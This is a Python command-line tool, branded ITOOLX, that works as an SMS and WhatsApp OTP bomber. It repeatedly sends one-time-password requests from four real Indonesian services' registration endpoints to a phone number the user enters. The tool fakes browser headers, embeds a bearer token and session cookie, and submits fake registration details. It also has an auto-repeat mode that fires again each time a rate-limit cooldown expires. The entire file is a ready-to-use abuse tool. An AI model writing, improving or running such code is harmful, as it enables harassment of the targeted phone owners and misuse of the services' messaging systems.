#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
import sys
import os
from datetime import datetime

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    from rich.align import Align
    from rich.live import Live
    from rich.text import Text
    from rich import box
    from rich.rule import Rule
except ImportError:
    os.system("pip install rich -q")
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    from rich.align import Align
    from rich.live import Live
    from rich.text import Text
    from rich import box
    from rich.rule import Rule

console = Console()

# ══════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════

APIS = {
    1: {"name": "Bunda.co.id",   "desc": "SMS",       "icon": "📱",
        "cooldown": 180, "color": "bright_magenta", "method": "bunda"},
    2: {"name": "OptikMelawai",  "desc": "SMS Reg",   "icon": "👓",
        "cooldown": 60,  "color": "bright_blue",    "method": "optik"},
    3: {"name": "Paper.id SMS",  "desc": "SMS",       "icon": "📄",
        "cooldown": 30,  "color": "bright_green",   "method": "paper_sms"},
    4: {"name": "PlanetBan",     "desc": "WhatsApp",  "icon": "🏪",
        "cooldown": 60,  "color": "bright_red",     "method": "planetban"},
    5: {"name": "ALL TARGETS",   "desc": "Semua API", "icon": "⚡",
        "cooldown": 0,   "color": "bold cyan",      "method": "all"},
}

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36")

BANNER = """\
[bold cyan] ██╗████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗
 ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     ╚██╗██╔╝
 ██║   ██║   ██║   ██║██║   ██║██║      ╚███╔╝ 
 ██║   ██║   ██║   ██║██║   ██║██║      ██╔██╗ 
 ██║   ██║   ╚██████╔╝╚██████╔╝███████╗██╔╝ ██╗
 ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝[/bold cyan]"""

# ══════════════════════════════════════════════════════════════
#  STATE
# ══════════════════════════════════════════════════════════════

cooldown_tracker: dict = {}   # { phone: { method: sent_at } }

# ══════════════════════════════════════════════════════════════
#  COOLDOWN HELPERS
# ══════════════════════════════════════════════════════════════

def get_rem(phone: str, method: str, cd: int) -> int:
    sent = cooldown_tracker.get(phone, {}).get(method)
    return 0 if sent is None else max(0, int(cd - (time.time() - sent)))

def set_cd(phone: str, method: str):
    cooldown_tracker.setdefault(phone, {})[method] = time.time()

def was_sent(phone: str, method: str) -> bool:
    return method in cooldown_tracker.get(phone, {})

def fmt(s: int) -> str:
    m, sc = divmod(s, 60)
    return f"{m}m{sc:02d}s" if m else f"   {sc}s"

def pbar(rem: int, total: int, w: int = 14) -> str:
    """Filled / empty block bar string (plain, colored by caller)."""
    if total == 0:
        return "█" * w
    done = max(0, int((total - rem) / total * w))
    return "█" * done + "░" * (w - done)

def is_ok(code: int) -> bool:
    return code in (200, 201, 202)

# ══════════════════════════════════════════════════════════════
#  STDIN FLUSH  (fix: enter ghost setelah Live)
# ══════════════════════════════════════════════════════════════

def flush_stdin():
    try:
        import termios
        termios.tcflush(sys.stdin, termios.TCIFLUSH)
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════
#  API FUNCTIONS
# ══════════════════════════════════════════════════════════════

def _h(**extra) -> dict:
    base = {
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Not;A=Brand";v="8","Chromium";v="150","Android WebView";v="150"',
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua-mobile": "?1",
        "accept-language": "id-ID,id;q=0.9",
    }
    base.update(extra)
    return base

def send_bunda(phone: str) -> dict:
    try:
        r = requests.post(
            "https://cms.bunda.co.id/api/v1/auth/send-otp",
            data=json.dumps({"phone_number": int(phone), "type": "auth"}),
            headers=_h(**{"Content-Type": "application/json", "x-locale": "id",
                          "origin": "https://www.bunda.co.id",
                          "x-requested-with": "com.chimbori.hermitcrab",
                          "referer": "https://www.bunda.co.id/id/hospitals"}),
            timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def send_optik(phone: str) -> dict:
    try:
        r = requests.post(
            "https://api.optikmelawai.com/api/v3/auth/register/1",
            files=[("name",(None,"Jonuis Dane")),("sex",(None,"1")),
                   ("birth_date",(None,"1995-07-28")),("mobile_number",(None,phone)),
                   ("password",(None,"Pangkey2005?")),("repassword",(None,"Pangkey2005?"))],
            headers=_h(**{"language": "id",
                          "authorization": "Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d",
                          "x-unique-user": "GA1.1.883509241.1785170487",
                          "origin": "https://optikmelawai.com",
                          "x-requested-with": "com.chimbori.hermitcrab",
                          "referer": "https://optikmelawai.com/",
                          "Cookie": "melawai_session=YJuJgaigHeAbkjFNqgZCzfVj8LZwyFZUjm5ZqntC"}),
            timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def send_paper_sms(phone: str) -> dict:
    try:
        r = requests.post(
            "https://register.paper.id/api/v1/auth/register/send-otp",
            data=json.dumps({"phone": phone, "method": "sms",
                             "registered_by": "flutter mweb"}),
            headers=_h(**{"Content-Type": "application/json", "authorization": "",
                          "x-paper-user-agent": "multiverse/2.58.1 mobile_web (android) chrome",
                          "origin": "https://paper.id",
                          "x-requested-with": "com.chimbori.hermitcrab",
                          "referer": "https://paper.id/"}),
            timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def send_planetban(phone: str) -> dict:
    num = phone if phone.startswith("62") else "62" + phone.lstrip("0")
    pb  = "0" + num[2:]
    try:
        r = requests.post(
            "https://api.planetban.com/website/customer/request-otp",
            data=json.dumps({"phone": pb, "purpose": "register", "method": "whatsapp"}),
            headers=_h(**{"Content-Type": "application/json",
                          "origin": "https://planetban.com",
                          "x-requested-with": "com.chimbori.hermitcrab",
                          "referer": "https://planetban.com/"}),
            timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def dispatch(method: str, phone: str) -> dict:
    if method == "bunda":     return send_bunda(phone)
    if method == "optik":     return send_optik(phone)
    if method == "paper_sms": return send_paper_sms(phone)
    if method == "planetban": return send_planetban(phone)
    return {}

# ══════════════════════════════════════════════════════════════
#  DISPLAY HELPERS
# ══════════════════════════════════════════════════════════════

def clr():
    os.system("cls" if os.name == "nt" else "clear")

def validate_phone(raw: str) -> str:
    p = raw.strip().replace(" ", "").replace("-", "")
    if p.startswith("+62"): return "62" + p[3:]
    if p.startswith("08"):  return "628" + p[2:]
    if p.startswith("8"):   return "62" + p
    return p

def result_line(code: int) -> tuple:
    """Return (icon, color, label)."""
    if is_ok(code):   return "✅", "bold green",  "SUCCESS"
    if code == 0:     return "❌", "bold red",    "ERROR"
    return "⚠️",  "bold yellow", f"HTTP {code}"

# ══════════════════════════════════════════════════════════════
#  HOME SCREEN
# ══════════════════════════════════════════════════════════════

def render_menu(phone: str = "") -> Table:
    t = Table(
        title=(
            "[bold cyan]⚡  PILIH TARGET[/bold cyan]"
            + (f"  [dim]→ [bright_yellow]{phone}[/bright_yellow][/dim]" if phone else "")
        ),
        box=box.DOUBLE_EDGE, border_style="cyan",
        header_style="bold cyan", show_lines=True,
    )
    t.add_column("No",  width=4,  justify="center", style="bold white")
    t.add_column("",    width=3,  justify="center")
    t.add_column("API", width=16, style="bold")
    t.add_column("Via", width=10)
    t.add_column("CD",  width=9,  justify="center")

    for num, api in APIS.items():
        if api["method"] == "all":
            cd_txt = "[dim]each[/dim]"
        elif phone:
            rem = get_rem(phone, api["method"], api["cooldown"])
            cd_txt = (f"[bold red]{fmt(rem).strip()}[/bold red]"
                      if rem > 0 else "[bold green]READY[/bold green]")
        else:
            cd_txt = f"[dim]{api['cooldown']}s[/dim]"

        t.add_row(
            f"[cyan]{num}[/cyan]", api["icon"],
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            f"[dim]{api['desc']}[/dim]", cd_txt,
        )

    t.add_row("[red]0[/red]", "🚪", "[red]EXIT[/red]", "[dim]Keluar[/dim]", "—")
    return t

def print_home(phone: str = ""):
    clr()
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(
        "[bold white]Multi-API OTP Sender[/bold white]  "
        "[dim]by[/dim] [bold cyan]ITOOLX[/bold cyan]  [dim]· Termux Edition[/dim]",
        border_style="cyan", padding=(0, 3),
    )))
    console.print()
    console.print(Align.center(render_menu(phone)))
    console.print()

# ══════════════════════════════════════════════════════════════
#  RESULT PANEL  (single API)
# ══════════════════════════════════════════════════════════════

def show_result(api: dict, phone: str, res: dict, round_n: int):
    clr()
    code = res.get("status", 0)
    body = res.get("body", "")
    prev = body[:100].replace("\n", " ") + ("…" if len(body) > 100 else "")
    ico, col, lbl = result_line(code)

    console.print(Align.center(Panel(
        f"  {api['icon']} [{api['color']}]{api['name']}[/{api['color']}]\n\n"
        f"  [bold white]Nomor  [/bold white] [bright_yellow]{phone}[/bright_yellow]\n"
        f"  [bold white]Round  [/bold white] [white]{round_n}[/white]\n"
        f"  [bold white]HTTP   [/bold white] [{col}]{code}  {lbl}[/{col}]\n"
        f"  [bold white]Waktu  [/bold white] [dim]{datetime.now().strftime('%H:%M:%S')}[/dim]\n\n"
        f"  [dim]{prev}[/dim]",
        title=f"[bold]{ico}  RESULT[/bold]",
        border_style="green" if is_ok(code) else "red",
        padding=(1, 2),
    )))
    console.print()

# ══════════════════════════════════════════════════════════════
#  RESULT TABLE  (ALL TARGETS)
# ══════════════════════════════════════════════════════════════

def show_all_results(phone: str, results: list, round_n: int):
    clr()
    t = Table(
        title=f"[bold cyan]⚡ ALL TARGETS  ·  Round {round_n}  ·  {phone}[/bold cyan]",
        box=box.ROUNDED, border_style="cyan",
        header_style="bold cyan", show_lines=True,
    )
    t.add_column("",       width=3,  justify="center")
    t.add_column("API",    width=18)
    t.add_column("HTTP",   width=6,  justify="center")
    t.add_column("Status", width=10)
    t.add_column("Jam",    width=9,  justify="center")

    for item in results:
        ico, col, lbl = result_line(item["status"])
        t.add_row(
            item["icon"],
            f"[bold]{item['name']}[/bold]",
            f"[{col}]{item['status']}[/{col}]",
            f"[{col}]{lbl}[/{col}]",
            f"[dim]{item['time']}[/dim]",
        )
    console.print(Align.center(t))
    console.print()

# ══════════════════════════════════════════════════════════════
#  COMPACT SEND LINE  (dipakai waktu R-mode all)
# ══════════════════════════════════════════════════════════════

def compact_line(api: dict, phone: str, res: dict, round_n: int) -> str:
    code = res.get("status", 0)
    ico, col, lbl = result_line(code)
    ts = datetime.now().strftime("%H:%M:%S")
    return (
        f"  {ico}  {api['icon']} [{api['color']}]{api['name']:<14}[/{api['color']}]"
        f"  [{col}]{lbl:<10}[/{col}]"
        f"  [dim]#{round_n}  {ts}[/dim]"
    )

# ══════════════════════════════════════════════════════════════
#  LIVE CD TABLE  (rich renderable, rebuilt every tick)
# ══════════════════════════════════════════════════════════════

def build_cd_panel(phone: str, targets: list, title: str = "") -> Panel:
    t = Table(box=box.SIMPLE, show_header=False,
              show_lines=False, padding=(0, 1))
    t.add_column("s",  width=2,  justify="center")
    t.add_column("nm", width=16)
    t.add_column("br", width=16)
    t.add_column("rm", width=9,  justify="right")
    t.add_column("ul", width=10, justify="center")

    for api in targets:
        rem  = get_rem(phone, api["method"], api["cooldown"])
        sent = cooldown_tracker.get(phone, {}).get(api["method"])
        cd   = api["cooldown"]

        if rem > 0 and sent:
            done  = cd - rem
            ratio = done / cd if cd else 1
            fill  = int(ratio * 14)
            bar   = (f"[cyan]{'█' * fill}[/cyan]"
                     f"[dim]{'░' * (14 - fill)}[/dim]")
            sisa  = f"[bold red]{fmt(rem).strip():>7}[/bold red]"
            ul    = datetime.fromtimestamp(sent + cd).strftime("%H:%M:%S")
            icon  = "[red]🔒[/red]"
        else:
            bar   = "[bold green]" + "█" * 14 + "[/bold green]"
            sisa  = "[bold green]  READY[/bold green]"
            ul    = "[dim]  —[/dim]"
            icon  = "[green]🔓[/green]"

        t.add_row(
            icon,
            f"[{api['color']}]{api['icon']} {api['name']}[/{api['color']}]",
            bar, sisa, f"[dim]{ul}[/dim]",
        )

    now = datetime.now().strftime("%H:%M:%S")
    return Panel(
        t,
        title=title or f"[bold yellow]⏱  COOLDOWN  ·  {phone}[/bold yellow]",
        subtitle=f"[dim]{now}[/dim]",
        border_style="yellow",
        padding=(0, 1),
    )

# ══════════════════════════════════════════════════════════════
#  PROMPT Y / R / N  (setelah CD selesai)
# ══════════════════════════════════════════════════════════════

def ask_yrn() -> str:
    """
    Tampil pilihan kirim lagi.  Return 'y' | 'r' | 'n'.
    Flush stdin dulu supaya ghost-enter dari Live tidak ikut.
    """
    flush_stdin()
    console.print(Panel(
        "  [bold cyan]Y[/bold cyan]  Kirim [bold]sekali[/bold] lagi\n"
        "  [bold cyan]R[/bold cyan]  [bold]Auto-repeat[/bold] — tiap target langsung kirim saat ready\n"
        "  [bold cyan]N[/bold cyan]  [bold]Stop[/bold] & kembali ke menu",
        title="[bold green]🔓 SIAP[/bold green]",
        border_style="green", padding=(0, 2),
    ))
    while True:
        try:
            flush_stdin()
            raw = Prompt.ask("[bold cyan]  ❯[/bold cyan]",
                             default="y").strip().lower()
            if raw in ("y", "r", "n"):
                return raw
        except (KeyboardInterrupt, EOFError):
            return "n"

# ══════════════════════════════════════════════════════════════
#  LIVE CD WAIT  (blocking, sampai semua/satu ready)
# ══════════════════════════════════════════════════════════════

def wait_until_ready(phone: str, targets: list):
    """Blok dan tampil live CD sampai SEMUA targets ready."""
    def any_locked():
        return any(get_rem(phone, a["method"], a["cooldown"]) > 0
                   for a in targets)

    if not any_locked():
        return

    try:
        with Live(build_cd_panel(phone, targets),
                  console=console, refresh_per_second=1,
                  transient=True) as live:
            while any_locked():
                time.sleep(1)
                live.update(build_cd_panel(phone, targets))
    except KeyboardInterrupt:
        raise

    flush_stdin()

# ══════════════════════════════════════════════════════════════
#  SESSION — SINGLE TARGET
# ══════════════════════════════════════════════════════════════

def session_single(api: dict, phone: str):
    round_n = 0

    # Kirim pertama (mungkin langsung atau tunggu CD)
    while True:
        # Tunggu CD jika perlu
        if round_n > 0:
            try:
                wait_until_ready(phone, [api])
            except KeyboardInterrupt:
                console.print("\n[bold red]  ✗ Stop.[/bold red]")
                return

        # ── Kirim ────────────────────────────────────────────────
        round_n += 1
        with console.status(
            f"[bold cyan]Mengirim → [bright_yellow]{api['name']}[/bright_yellow]...",
            spinner="dots",
        ):
            res = dispatch(api["method"], phone)
        set_cd(phone, api["method"])
        show_result(api, phone, res, round_n)

        # ── Tanya Y/R/N ─────────────────────────────────────────
        try:
            ans = ask_yrn()
        except (KeyboardInterrupt, EOFError):
            return

        if ans == "n":
            return
        if ans == "r":
            # auto-repeat: masuk loop R mode
            session_single_r(api, phone, round_n)
            return
        # ans == "y": loop sekali lagi

def session_single_r(api: dict, phone: str, start_round: int):
    """R-mode untuk single target: kirim tiap kali CD habis."""
    round_n = start_round
    console.print(Panel(
        "[dim]Auto-repeat aktif.  [bold]Ctrl+C[/bold] untuk stop.[/dim]",
        border_style="dim", padding=(0, 2),
    ))

    while True:
        try:
            wait_until_ready(phone, [api])
        except KeyboardInterrupt:
            console.print("\n[bold red]  ✗ Auto-repeat dihentikan.[/bold red]")
            return

        round_n += 1
        with console.status(
            f"[bold cyan]Auto → [bright_yellow]{api['name']}[/bright_yellow]...",
            spinner="dots",
        ):
            res = dispatch(api["method"], phone)
        set_cd(phone, api["method"])
        show_result(api, phone, res, round_n)

        console.print(Panel(
            "[dim]Auto-repeat lanjut...  [bold]Ctrl+C[/bold] untuk stop.[/dim]",
            border_style="dim", padding=(0, 2),
        ))

# ══════════════════════════════════════════════════════════════
#  SESSION — ALL TARGETS (Y mode: tunggu semua, kirim semua)
# ══════════════════════════════════════════════════════════════

def session_all_y(phone: str, targets: list) -> int:
    """Kirim sekali ke semua target (tunggu yang masih CD dulu).
       Return round_n setelah kirim."""
    try:
        wait_until_ready(phone, targets)
    except KeyboardInterrupt:
        raise

    results = []
    for api in targets:
        with console.status(
            f"[bold cyan]→ [bright_yellow]{api['name']}[/bright_yellow]...",
            spinner="aesthetic",
        ):
            t   = datetime.now().strftime("%H:%M:%S")
            res = dispatch(api["method"], phone)
            set_cd(phone, api["method"])
        results.append({
            "name": api["name"], "icon": api["icon"],
            "status": res.get("status", 0), "time": t,
        })
        time.sleep(0.15)

    return results

# ══════════════════════════════════════════════════════════════
#  SESSION — ALL TARGETS R-MODE
#  Kirim tiap target SEGERA saat CD-nya habis, tanpa tunggu yang lain
# ══════════════════════════════════════════════════════════════

def session_all_r(phone: str, targets: list, initial_round: int = 0):
    """
    R-mode ALL: monitor CD semua target secara live.
    Begitu satu target ready → langsung kirim tanpa tunggu yang lain.
    Ctrl+C untuk stop.
    """
    round_counts = {a["method"]: initial_round for a in targets}

    console.print(Panel(
        "[dim]Auto-repeat ALL aktif — setiap target dikirim "
        "segera saat CD-nya habis.\n"
        "[bold]Ctrl+C[/bold] untuk stop.[/dim]",
        border_style="dim", padding=(0, 2),
    ))
    time.sleep(0.5)

    # Tandai target yang BELUM pernah dikirim (first-run setelah pilih R)
    # Mereka langsung masuk antrian kirim
    pending_first: set = set()
    for a in targets:
        if not was_sent(phone, a["method"]):
            pending_first.add(a["method"])

    def needs_send(api: dict) -> bool:
        """True jika target ini perlu dikirim sekarang."""
        if api["method"] in pending_first:
            return True
        return get_rem(phone, api["method"], api["cooldown"]) == 0 and \
               was_sent(phone, api["method"])

    try:
        while True:
            # Cek target yang siap dikirim
            ready_now = [a for a in targets if needs_send(a)]

            if ready_now:
                # Stop live sebentar, kirim semua yang ready, print compact
                for api in ready_now:
                    pending_first.discard(api["method"])
                    round_counts[api["method"]] += 1
                    rn = round_counts[api["method"]]

                    with console.status(
                        f"[bold cyan]→ [bright_yellow]{api['name']}[/bright_yellow]  "
                        f"[dim]#{rn}[/dim]",
                        spinner="dots",
                    ):
                        res = dispatch(api["method"], phone)
                    set_cd(phone, api["method"])
                    console.print(compact_line(api, phone, res, rn))
                    time.sleep(0.1)

            # Live CD table sebentar (1 detik)
            try:
                with Live(
                    build_cd_panel(phone, targets,
                                   title=f"[bold yellow]⚡ AUTO-REPEAT  ·  {phone}[/bold yellow]"),
                    console=console, refresh_per_second=4,
                    transient=True,
                ) as live:
                    elapsed = 0
                    while elapsed < 10:
                        time.sleep(0.25)
                        elapsed += 0.25
                        live.update(build_cd_panel(
                            phone, targets,
                            title=f"[bold yellow]⚡ AUTO-REPEAT  ·  {phone}[/bold yellow]",
                        ))
                        # Kalau ada yang ready, keluar dari inner live lebih cepat
                        if any(needs_send(a) for a in targets):
                            break
            except KeyboardInterrupt:
                raise

    except KeyboardInterrupt:
        flush_stdin()
        console.print("\n[bold red]  ✗ Auto-repeat dihentikan.[/bold red]")

# ══════════════════════════════════════════════════════════════
#  SESSION — ALL TARGETS (entry point)
# ══════════════════════════════════════════════════════════════

def session_all(phone: str):
    targets = [v for v in APIS.values() if v["method"] != "all"]
    round_n = 0

    while True:
        # Kirim semua yang belum CD / sudah ready
        try:
            results = session_all_y(phone, targets)
        except KeyboardInterrupt:
            console.print("\n[bold red]  ✗ Stop.[/bold red]")
            return

        round_n += 1
        show_all_results(phone, results, round_n)

        # Tanya Y/R/N
        try:
            ans = ask_yrn()
        except (KeyboardInterrupt, EOFError):
            return

        if ans == "n":
            return
        if ans == "r":
            session_all_r(phone, targets, initial_round=round_n)
            return
        # ans == "y": ulangi loop (tunggu CD semua lalu kirim)

# ══════════════════════════════════════════════════════════════
#  INPUT HELPER
# ══════════════════════════════════════════════════════════════

def ask_phone(current: str = "") -> str:
    hint = (f" [dim](Enter = {current})[/dim]"
            if current else " [dim](08xxx / 628xxx / +62xxx)[/dim]")
    while True:
        try:
            flush_stdin()
            raw = Prompt.ask(f"[bold cyan]  ❯[/bold cyan] Nomor{hint}")
            if raw.strip() == "" and current:
                return current
            p = validate_phone(raw)
            if len(p) >= 10:
                return p
            console.print("[bold red]  ✗ Nomor tidak valid.[/bold red]")
        except (KeyboardInterrupt, EOFError):
            console.print()
            sys.exit(0)

# ══════════════════════════════════════════════════════════════
#  MAIN LOOP
# ══════════════════════════════════════════════════════════════

def main():
    current_phone = ""

    while True:
        print_home(current_phone)

        # ── Pilih target ────────────────────────────────────────
        try:
            flush_stdin()
            raw    = Prompt.ask("[bold cyan]  ❯[/bold cyan] Pilih [dim](0 = exit)[/dim]")
            choice = int(raw.strip())
        except (ValueError, KeyboardInterrupt, EOFError):
            time.sleep(0.4)
            continue

        if choice == 0:
            clr()
            console.print(Align.center(Panel(
                "[bold red]👋  Sampai jumpa![/bold red]\n"
                "[dim]ITOOLX · Termux Edition[/dim]",
                border_style="red", padding=(1, 4),
            )))
            sys.exit(0)

        if choice not in APIS:
            time.sleep(0.4)
            continue

        api = APIS[choice]

        # ── Input nomor ─────────────────────────────────────────
        clr()
        console.print(Align.center(Panel(
            f"{api['icon']} [{api['color']}]{api['name']}[/{api['color']}]",
            border_style="cyan", padding=(0, 4),
        )))
        console.print()
        current_phone = ask_phone(current_phone)
        console.print()

        # ── Cek CD awal ─────────────────────────────────────────
        targets = (
            [v for v in APIS.values() if v["method"] != "all"]
            if api["method"] == "all"
            else [api]
        )
        locked = [a for a in targets
                  if get_rem(current_phone, a["method"], a["cooldown"]) > 0]

        if locked:
            console.print(Align.center(
                build_cd_panel(current_phone, targets,
                               title="[bold red]🔒 COOLDOWN AKTIF[/bold red]")
            ))
            console.print()
            console.print(
                "  [bold cyan]Y[/bold cyan] = Tunggu CD selesai lalu kirim\n"
                "  [bold cyan]N[/bold cyan] = Batal ke menu\n"
            )
            try:
                flush_stdin()
                ans = Prompt.ask("[bold cyan]  ❯[/bold cyan]",
                                 default="y").strip().lower()
            except (KeyboardInterrupt, EOFError):
                ans = "n"

            if ans != "y":
                continue

        # ── Mulai sesi ───────────────────────────────────────────
        try:
            if api["method"] == "all":
                session_all(current_phone)
            else:
                session_single(api, current_phone)
        except KeyboardInterrupt:
            console.print("\n[bold red]  ✗ Dihentikan.[/bold red]")
            time.sleep(0.8)

        # kembali ke home
        time.sleep(0.8)


if __name__ == "__main__":
    main()
